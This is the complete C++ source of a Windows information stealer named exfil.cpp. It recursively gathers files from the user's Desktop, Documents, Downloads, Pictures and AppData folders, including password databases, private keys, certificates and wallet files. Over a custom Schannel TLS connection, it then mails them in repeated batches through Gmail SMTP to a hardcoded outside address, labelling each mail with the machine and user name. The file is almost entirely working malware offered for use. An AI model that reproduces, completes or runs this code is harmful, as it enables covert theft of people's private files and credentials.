// exfil.cpp — Windows user-profile file collector + Gmail SMTP exfil
// build: cl /EHsc /O2 /std:c++17 /Fe:app.exe exfil.cpp ws2_32.lib secur32.lib crypt32.lib
#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>
#include <wincrypt.h>

#include <string>
#include <vector>
#include <set>
#include <thread>
#include <chrono>
#include <cstdio>
#include <cctype>
#include <cstring>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

// ======================= CONFIG =======================
static const char* MAIL_FROM = "sender@gmail.com";
static const char* MAIL_PASS = "xxxxxxxxxxxxxxxx";    // 16-char app password
static const char* MAIL_TO   = "temnij.lord322@gmail.com";
static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;
static const DWORD SLEEP_SCAN_MS = 600000;
static const size_t MAX_ATTACH = 18u * 1024 * 1024;
// ======================================================

// ---------- base64 ----------
static std::string b64(const unsigned char* d, size_t n) {
    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o; o.reserve(((n + 2) / 3) * 4);
    size_t i = 0;
    for (; i + 2 < n; i += 3) {
        unsigned v = ((unsigned)d[i] << 16) | ((unsigned)d[i+1] << 8) | (unsigned)d[i+2];
        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
        o.push_back(T[(v >> 6) & 63]);  o.push_back(T[v & 63]);
    }
    if (i < n) {
        unsigned v = (unsigned)d[i] << 16;
        if (i + 1 < n) v |= (unsigned)d[i+1] << 8;
        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
        o.push_back((i + 1 < n) ? T[(v >> 6) & 63] : '=');
        o.push_back('=');
    }
    return o;
}
static std::string b64(const std::string& s) {
    return b64(reinterpret_cast<const unsigned char*>(s.data()), s.size());
}

// ---------- host id ----------
static std::string host_id() {
    char name[64] = {0}; DWORD sz = sizeof(name);
    GetComputerNameA(name, &sz);
    char user[64] = {0}; DWORD us = sizeof(user);
    GetUserNameA(user, &us);
    return std::string(name) + "_" + std::string(user);
}

// ---------- schannel TLS wrapper ----------
struct TlsSock {
    SOCKET s = INVALID_SOCKET;
    CredHandle cred{};
    CtxtHandle ctx{};
    SecPkgContext_StreamSizes sizes{};
    bool ready = false;

    bool connect(const char* host, const char* port) {
        addrinfo hints{}; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
        addrinfo* res = nullptr;
        if (getaddrinfo(host, port, &hints, &res) != 0) return false;
        s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s == INVALID_SOCKET) { freeaddrinfo(res); return false; }
        if (::connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
            freeaddrinfo(res); closesocket(s); s = INVALID_SOCKET; return false;
        }
        freeaddrinfo(res);
        return do_handshake(host);
    }

    bool do_handshake(const char* host) {
        SCHANNEL_CRED sc{}; sc.dwVersion = SCHANNEL_CRED_VERSION;
        sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
        sc.dwFlags = SCH_USE_STRONG_CRYPTO;
        TimeStamp ts{};
        if (AcquireCredentialsHandleA(nullptr, const_cast<SEC_CHAR*>(UNISP_NAME_A),
            SECPKG_CRED_OUTBOUND, nullptr, &sc, nullptr, nullptr, &cred, &ts) != SEC_E_OK)
            return false;

        DWORD req = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                    ISC_REQ_CONFIDENTIALITY | ISC_REQ_EXTENDED_ERROR |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;

        bool done = false;
        while (!done) {
            SecBuffer out{}; out.BufferType = SECBUFFER_TOKEN; out.cbBuffer = 0; out.pvBuffer = nullptr;
            SecBufferDesc outd{ SECBUFFER_VERSION, 1, &out };
            DWORD flags = req;
            SECURITY_STATUS ss = InitializeSecurityContextA(&cred,
                ctx.dwLower ? &ctx : nullptr, const_cast<SEC_CHAR*>(host),
                req, 0, 0, nullptr, 0, nullptr, &outd, &flags, &ts);

            if (ss == SEC_E_OK) {
                if (out.cbBuffer && out.pvBuffer) {
                    ::send(s, (const char*)out.pvBuffer, (int)out.cbBuffer, 0);
                    FreeContextBuffer(out.pvBuffer);
                }
                done = true;
            } else if (ss == SEC_I_CONTINUE_NEEDED) {
                if (out.cbBuffer && out.pvBuffer) {
                    ::send(s, (const char*)out.pvBuffer, (int)out.cbBuffer, 0);
                    FreeContextBuffer(out.pvBuffer);
                }
                std::vector<char> tmp(16384);
                int n = recv(s, tmp.data(), (int)tmp.size(), 0);
                if (n <= 0) return false;
                SecBuffer inb{};
                inb.BufferType = SECBUFFER_TOKEN;
                inb.cbBuffer = (unsigned long)n;
                inb.pvBuffer = tmp.data();
                SecBufferDesc ind{ SECBUFFER_VERSION, 1, &inb };
                out.cbBuffer = 0; out.pvBuffer = nullptr;
                ss = InitializeSecurityContextA(&cred, &ctx, const_cast<SEC_CHAR*>(host),
                    req, 0, 0, &ind, 0, nullptr, &outd, &flags, &ts);
                if (out.cbBuffer && out.pvBuffer) {
                    ::send(s, (const char*)out.pvBuffer, (int)out.cbBuffer, 0);
                    FreeContextBuffer(out.pvBuffer);
                }
                if (ss == SEC_E_OK) done = true;
                else if (ss != SEC_I_CONTINUE_NEEDED) return false;
            } else {
                return false;
            }
        }

        if (QueryContextAttributesA(&ctx, SECPKG_ATTR_STREAM_SIZES, &sizes) != SEC_E_OK)
            return false;
        ready = true;
        return true;
    }

    bool send_all(const std::string& data) {
        size_t sent = 0;
        while (sent < data.size()) {
            size_t chunk = data.size() - sent;
            if (chunk > (size_t)sizes.cbMaximumMessage) chunk = (size_t)sizes.cbMaximumMessage;

            std::vector<char> buf((size_t)sizes.cbHeader + chunk + (size_t)sizes.cbTrailer);
            memcpy(buf.data() + sizes.cbHeader, data.data() + sent, chunk);

            SecBuffer sb[4] = {};
            sb[0].BufferType = SECBUFFER_STREAM_HEADER;
            sb[0].pvBuffer = buf.data();
            sb[0].cbBuffer = sizes.cbHeader;

            sb[1].BufferType = SECBUFFER_DATA;
            sb[1].pvBuffer = buf.data() + sizes.cbHeader;
            sb[1].cbBuffer = (unsigned long)chunk;

            sb[2].BufferType = SECBUFFER_STREAM_TRAILER;
            sb[2].pvBuffer = buf.data() + sizes.cbHeader + chunk;
            sb[2].cbBuffer = sizes.cbTrailer;

            sb[3].BufferType = SECBUFFER_EMPTY;
            sb[3].pvBuffer = nullptr;
            sb[3].cbBuffer = 0;

            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
            if (EncryptMessage(&ctx, 0, &bd, 0) != SEC_E_OK) return false;

            unsigned long total = sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer;
            size_t off = 0;
            while (off < total) {
                int n = ::send(s, buf.data() + off, (int)(total - off), 0);
                if (n <= 0) return false;
                off += (size_t)n;
            }
            sent += chunk;
        }
        return true;
    }

    std::string recv_line_blocking(int timeout_ms) {
        std::string plain;
        DWORD start = GetTickCount();
        std::vector<char> enc((size_t)sizes.cbHeader + 16384 + (size_t)sizes.cbTrailer);
        while (GetTickCount() - start < (DWORD)timeout_ms) {
            int n = recv(s, enc.data(), (int)enc.size(), 0);
            if (n <= 0) break;

            SecBuffer sb[4] = {};
            sb[0].BufferType = SECBUFFER_DATA;
            sb[0].pvBuffer = enc.data();
            sb[0].cbBuffer = (unsigned long)n;

            sb[1].BufferType = SECBUFFER_EMPTY; sb[1].pvBuffer = nullptr; sb[1].cbBuffer = 0;
            sb[2].BufferType = SECBUFFER_EMPTY; sb[2].pvBuffer = nullptr; sb[2].cbBuffer = 0;
            sb[3].BufferType = SECBUFFER_EMPTY; sb[3].pvBuffer = nullptr; sb[3].cbBuffer = 0;

            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
            SECURITY_STATUS ss = DecryptMessage(&ctx, &bd, 0, nullptr);
            if (ss == SEC_E_OK) {
                for (int i = 0; i < 4; i++)
                    if (sb[i].BufferType == SECBUFFER_DATA && sb[i].cbBuffer)
                        plain.append((char*)sb[i].pvBuffer, sb[i].cbBuffer);
                if (plain.find("\r\n") != std::string::npos) return plain;
            } else if (ss == SEC_I_CONTEXT_EXPIRED) {
                break;
            }
        }
        return plain;
    }

    void close() {
        if (ctx.dwLower) { DeleteSecurityContext(&ctx); ctx.dwLower = 0; ctx.dwUpper = 0; }
        if (cred.dwLower) { FreeCredentialsHandle(&cred); cred.dwLower = 0; cred.dwUpper = 0; }
        if (s != INVALID_SOCKET) { closesocket(s); s = INVALID_SOCKET; }
        ready = false;
    }
};

// ---------- SMTP ----------
struct Smtp {
    TlsSock tls;

    bool open(const char* host, const char* port) {
        if (!tls.connect(host, port)) return false;
        tls.recv_line_blocking(5000);
        return true;
    }
    std::string cmd(const std::string& c) {
        tls.send_all(c + "\r\n");
        return tls.recv_line_blocking(8000);
    }
    bool auth() {
        cmd("EHLO localhost");
        std::string r = cmd("AUTH LOGIN");
        if (r.substr(0, 3) != "334") return false;
        r = cmd(b64(std::string(MAIL_FROM)));
        if (r.substr(0, 3) != "334") return false;
        r = cmd(b64(std::string(MAIL_PASS)));
        return r.substr(0, 3) == "235";
    }
    bool send_mail(const std::string& subject, const std::string& body,
                   const std::vector<std::pair<std::string, std::string>>& attach) {
        cmd(std::string("MAIL FROM:<") + MAIL_FROM + ">");
        cmd(std::string("RCPT TO:<") + MAIL_TO + ">");
        if (cmd("DATA").substr(0, 3) != "354") return false;

        std::string boundary = "----=_b" + std::to_string((unsigned long long)GetTickCount());
        std::string msg;
        msg += std::string("From: ") + MAIL_FROM + "\r\n";
        msg += std::string("To: ") + MAIL_TO + "\r\n";
        msg += "Subject: " + subject + "\r\n";
        msg += "MIME-Version: 1.0\r\n";
        msg += "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n\r\n";
        msg += "--" + boundary + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        msg += body + "\r\n";

        for (size_t k = 0; k < attach.size(); ++k) {
            const std::string& name = attach[k].first;
            const std::string& raw  = attach[k].second;
            msg += "--" + boundary + "\r\n";
            msg += "Content-Type: application/octet-stream; name=\"" + name + "\"\r\n";
            msg += "Content-Transfer-Encoding: base64\r\n";
            msg += "Content-Disposition: attachment; filename=\"" + name + "\"\r\n\r\n";
            std::string enc = b64(reinterpret_cast<const unsigned char*>(raw.data()), raw.size());
            for (size_t i = 0; i < enc.size(); i += 76)
                msg += enc.substr(i, 76) + "\r\n";
        }
        msg += "--" + boundary + "--\r\n";

        // dot-stuffing
        std::string out; out.reserve(msg.size() + 16);
        size_t pos = 0;
        while (pos < msg.size()) {
            size_t eol = msg.find("\r\n", pos);
            if (eol == std::string::npos) { out += msg.substr(pos); break; }
            std::string line = msg.substr(pos, eol - pos);
            if (!line.empty() && line[0] == '.') out += ".";
            out += line + "\r\n";
            pos = eol + 2;
        }
        out += ".\r\n";
        tls.send_all(out);
        std::string r = tls.recv_line_blocking(15000);
        cmd("QUIT");
        return r.substr(0, 3) == "250";
    }
};

// ---------- file discovery ----------
static bool interesting_ext(const std::string& ext) {
    static const std::set<std::string> s = {
        ".txt",".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".csv",
        ".jpg",".jpeg",".png",".gif",".bmp",
        ".kdbx",".key",".pem",".pfx",".p12",".wallet",".dat",
        ".zip",".rar",".7z",".sql",".db",".sqlite"
    };
    std::string e;
    for (size_t i = 0; i < ext.size(); ++i)
        e.push_back((char)std::tolower((unsigned char)ext[i]));
    return s.find(e) != s.end();
}
static std::string ext_of(const std::string& p) {
    std::string::size_type d = p.find_last_of('.');
    return d == std::string::npos ? std::string() : p.substr(d);
}
static std::string leaf(const std::string& p) {
    std::string::size_type d = p.find_last_of("\\/");
    return d == std::string::npos ? p : p.substr(d + 1);
}

static void collect(const std::wstring& dir, std::vector<std::wstring>& out, int depth) {
    if (depth > 4) return;
    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
            collect(full, out, depth + 1);
        } else {
            LARGE_INTEGER sz{};
            sz.LowPart = fd.nFileSizeLow;
            sz.HighPart = (LONG)fd.nFileSizeHigh;
            if (sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)MAX_ATTACH) {
                std::string a(full.begin(), full.end());
                if (interesting_ext(ext_of(a))) out.push_back(full);
            }
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static std::string read_file(const std::wstring& p) {
    HANDLE f = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return std::string();
    LARGE_INTEGER sz{};
    if (!GetFileSizeEx(f, &sz) || sz.QuadPart <= 0 || sz.QuadPart > (LONGLONG)MAX_ATTACH) {
        CloseHandle(f);
        return std::string();
    }
    std::string d((size_t)sz.QuadPart, '\0');
    DWORD rd = 0;
    if (!ReadFile(f, &d[0], (DWORD)d.size(), &rd, nullptr)) {
        CloseHandle(f);
        return std::string();
    }
    CloseHandle(f);
    d.resize(rd);
    return d;
}

// ---------- main ----------
int main() {
    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    std::string hid = host_id();
    std::set<std::string> sent_paths;

    for (;;) {
        std::vector<std::wstring> files;
        wchar_t up[MAX_PATH] = {0};
        GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);

        const wchar_t* subs[] = {
            L"\\Desktop", L"\\Documents", L"\\Downloads",
            L"\\Pictures", L"\\AppData\\Roaming"
        };
        for (int i = 0; i < 5; ++i)
            collect(std::wstring(up) + subs[i], files, 0);

        Smtp mail;
        bool mail_open = false;
        std::vector<std::pair<std::string, std::string>> batch;
        size_t batch_bytes = 0;

        auto flush = [&]() {
            if (batch.empty()) return;
            if (!mail_open) {
                mail_open = mail.open("smtp.gmail.com", "465") && mail.auth();
            }
            if (!mail_open) { batch.clear(); batch_bytes = 0; return; }

            std::string subj = "[" + hid + "] " + std::to_string(batch.size()) + " file(s)";
            mail.send_mail(subj, "auto-collected", batch);

            batch.clear();
            batch_bytes = 0;
            std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_MAILS_MS));
        };

        for (size_t i = 0; i < files.size(); ++i) {
            const std::wstring& f = files[i];
            std::string a(f.begin(), f.end());
            if (sent_paths.count(a)) continue;

            std::string data = read_file(f);
            if (data.empty()) { sent_paths.insert(a); continue; }

            if (batch_bytes + data.size() > MAX_ATTACH || batch.size() >= 3)
                flush();

            batch.emplace_back(leaf(a), data);
            batch_bytes += data.size();
            sent_paths.insert(a);
        }
        flush();
        if (mail_open) mail.tls.close();

        std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_SCAN_MS));
    }

    WSACleanup();
    return 0;
}
